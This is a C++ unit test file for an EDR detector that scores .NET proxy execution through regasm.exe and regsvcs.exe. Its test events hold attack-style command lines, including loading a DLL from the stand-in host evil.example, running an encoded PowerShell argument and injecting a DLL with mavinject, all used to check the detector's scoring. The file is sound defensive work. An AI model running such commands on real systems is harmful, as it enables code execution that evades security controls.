/*
 * dotnet_proxy_exec_detector_tests.cpp - Unit tests for
 * DotnetProxyExecDetector (T1218.009).
 */
#include "dotnet_proxy_exec_detector_tests.h"
#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>
#include "edr_event.h"
#include "event_bus.h"
#include "dotnet_proxy_exec_detector.h"

namespace {
#define SR_CHECK(c) Check((c), #c, __LINE__)
void Check(bool c,const char* e,int l){
    if(!c) throw std::runtime_error(std::string("CHECK failed at ")+std::to_string(l)+": "+e);
}
edr::Event ProcEvent(uint64_t ts,const char* img,const char* cmd,const char* parent=nullptr){
    edr::Event ev; ev.type=EDR_EVT_PROCESS_START; ev.ts100ns=ts;
    ev.fields[edr::field::kType]="PROCESS_START";
    ev.fields[edr::field::kImage]=img;
    if(cmd) ev.fields[edr::field::kCommandLine]=cmd;
    if(parent) ev.fields[edr::field::kParentImage]=parent;
    return ev;
}
edr::Event ScriptEvent(uint64_t ts,const char* body){
    edr::Event ev; ev.type=EDR_EVT_POWERSHELL_SCRIPT; ev.ts100ns=ts;
    ev.fields[edr::field::kType]="POWERSHELL_SCRIPT";
    if(body) ev.fields[edr::field::kScriptBlockText]=body;
    return ev;
}
std::string Score(const edr::Event& e){
    auto it=e.fields.find(edr::field::kDotnetProxyExecScore);
    return it==e.fields.end()?"":it->second;
}
std::string Verdict(const edr::Event& e){
    auto it=e.fields.find(edr::field::kDotnetProxyExecVerdict);
    return it==e.fields.end()?"":it->second;
}
/* True when ANY of the four detector fields was written. */
bool HasAnyFinding(const edr::Event& e){
    return e.fields.count(edr::field::kDotnetProxyExecScore)!=0||
           e.fields.count(edr::field::kDotnetProxyExecVerdict)!=0||
           e.fields.count(edr::field::kDotnetProxyExecSignals)!=0||
           e.fields.count(edr::field::kDotnetProxyExecText)!=0;
}
const char* kRegasm="C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe";
const char* kRegsvcs="C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe";
} // namespace

void RunDotnetProxyExecDetectorTests(){
    std::fprintf(stderr, "[dpe] TestDisabled\n");
    {
        edr::DotnetProxyExecDetector d(false,55,300,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\regsvcs.exe",
            "regsvcs.exe C:\\Users\\Public\\evil.dll");
        d.Enrich(ev); SR_CHECK(Score(ev).empty()); SR_CHECK(!HasAnyFinding(ev));
        SR_CHECK(d.StateCount()==0);
    }
    std::fprintf(stderr, "[dpe] TestRemoteAssembly\n");
    {
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,kRegsvcs,"regsvcs.exe http://evil.example/payload.dll");
        d.Enrich(ev); SR_CHECK(Score(ev)=="90"); SR_CHECK(Verdict(ev)=="malicious");
    }
    std::fprintf(stderr, "[dpe] TestUncAssembly\n");
    {
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,kRegasm,"regasm.exe \\\\fileserver\\share\\evil.dll");
        d.Enrich(ev); SR_CHECK(Score(ev)=="90");
    }
    std::fprintf(stderr, "[dpe] TestWritableAssembly\n");
    {
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,kRegasm,"regasm.exe C:\\Users\\Public\\evil.dll");
        d.Enrich(ev); SR_CHECK(Score(ev)=="90"); SR_CHECK(Verdict(ev)=="malicious");
    }
    std::fprintf(stderr, "[dpe] TestUnregisterWritable\n");
    {
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,kRegasm,"regasm.exe /U C:\\Users\\Public\\evil.dll");
        d.Enrich(ev); SR_CHECK(Score(ev)=="85"); SR_CHECK(Verdict(ev)=="malicious");
    }
    std::fprintf(stderr, "[dpe] TestInterpreterRef\n");
    {
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,kRegsvcs,"regsvcs.exe powershell -enc AAAA");
        d.Enrich(ev); SR_CHECK(Score(ev)=="85"); SR_CHECK(Verdict(ev)=="malicious");
    }
    std::fprintf(stderr, "[dpe] TestPlainAssemblyArg\n");
    {
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,kRegasm,"regasm.exe C:\\libs\\MyLib.dll");
        d.Enrich(ev); SR_CHECK(Score(ev)=="75"); SR_CHECK(Verdict(ev)=="malicious");
    }
    std::fprintf(stderr, "[dpe] TestOfficeParentBoost\n");
    {
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,kRegasm,"regasm.exe C:\\libs\\MyLib.dll",
            "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE");
        d.Enrich(ev); SR_CHECK(Score(ev)=="85");
    }
    std::fprintf(stderr, "[dpe] TestScriptHostParentBoost\n");
    {
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,kRegasm,"regasm.exe C:\\libs\\MyLib.dll",
            "C:\\Windows\\System32\\wscript.exe");
        d.Enrich(ev); SR_CHECK(Score(ev)=="85");
    }
    std::fprintf(stderr, "[dpe] TestScriptSurface\n");
    {
        // POWERSHELL_SCRIPT body lives in kScriptBlockText only.
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ScriptEvent(10000000ULL,
            "Start-Process regsvcs.exe -ArgumentList 'C:\\Users\\Public\\evil.dll'");
        d.Enrich(ev); SR_CHECK(Score(ev)=="90");
    }
    std::fprintf(stderr, "[dpe] TestEmptyScriptSilent\n");
    {
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ScriptEvent(10000000ULL,nullptr);
        d.Enrich(ev); SR_CHECK(!HasAnyFinding(ev));
    }
    std::fprintf(stderr, "[dpe] TestBareSilent\n");
    {
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,kRegsvcs,"regsvcs.exe");
        d.Enrich(ev); SR_CHECK(!HasAnyFinding(ev));
    }
    std::fprintf(stderr, "[dpe] TestHelpSilent\n");
    {
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,kRegasm,"regasm.exe /?");
        d.Enrich(ev); SR_CHECK(!HasAnyFinding(ev));
    }
    std::fprintf(stderr, "[dpe] TestNonProxyCompilerSilent\n");
    {
        // csc.exe is dev_util_proxy_detector territory - must not fire here.
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,
            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
            "csc.exe /t:exe /out:C:\\Users\\Public\\evil.exe C:\\Users\\Public\\evil.cs");
        d.Enrich(ev); SR_CHECK(!HasAnyFinding(ev));
    }
    std::fprintf(stderr, "[dpe] TestNonProxyInjectorSilent\n");
    {
        // mavinject.exe is signed_binary_abuse_detector territory.
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\mavinject.exe",
            "mavinject.exe 1234 /INJECTRUNNING C:\\Users\\Public\\x.dll");
        d.Enrich(ev); SR_CHECK(!HasAnyFinding(ev));
    }
    std::fprintf(stderr, "[dpe] TestMinScoreBoundary\n");
    {
        // At the house floor (55) the plain 75 shape is reported.
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,kRegasm,"regasm.exe C:\\libs\\MyLib.dll");
        d.Enrich(ev); SR_CHECK(Score(ev)=="75");
    }
    {
        // One above the floor: min_score=76 silences a 75 shape entirely.
        edr::DotnetProxyExecDetector d(true,76,0,1024);
        auto ev=ProcEvent(10000000ULL,kRegasm,"regasm.exe C:\\libs\\MyLib.dll");
        d.Enrich(ev); SR_CHECK(Score(ev).empty()); SR_CHECK(!HasAnyFinding(ev));
    }
    {
        // min_score=100 silences even the 90 shape (nothing written).
        edr::DotnetProxyExecDetector d(true,100,0,1024);
        auto ev=ProcEvent(10000000ULL,kRegsvcs,"regsvcs.exe http://evil.example/a.dll");
        d.Enrich(ev); SR_CHECK(!HasAnyFinding(ev));
    }
    std::fprintf(stderr, "[dpe] TestDedupCooldown\n");
    {
        edr::DotnetProxyExecDetector d(true,55,300,1024);
        auto e1=ProcEvent(10000000ULL,kRegasm,"regasm.exe C:\\libs\\MyLib.dll");
        d.Enrich(e1); SR_CHECK(Score(e1)=="75"); SR_CHECK(d.StateCount()==1);
        // Same command one second later -> still inside the 300s cooldown.
        auto e2=ProcEvent(20000000ULL,kRegasm,"regasm.exe C:\\libs\\MyLib.dll");
        d.Enrich(e2); SR_CHECK(!HasAnyFinding(e2));
        // Beyond the window -> reported again.
        auto e3=ProcEvent(10000000ULL+301ULL*10000000ULL,kRegasm,"regasm.exe C:\\libs\\MyLib.dll");
        d.Enrich(e3); SR_CHECK(Score(e3)=="75");
    }
    std::fprintf(stderr, "[dpe] TestWrongTypeSilent\n");
    {
        edr::DotnetProxyExecDetector d(true,55,0,1024);
        edr::Event ev; ev.type=EDR_EVT_FILE_CREATE; ev.ts100ns=10000000ULL;
        ev.fields[edr::field::kImage]=kRegasm;
        ev.fields[edr::field::kCommandLine]="regasm.exe C:\\Users\\Public\\evil.dll";
        d.Enrich(ev); SR_CHECK(!HasAnyFinding(ev));
    }
    std::fprintf(stderr, "[dpe] all passed\n");
}
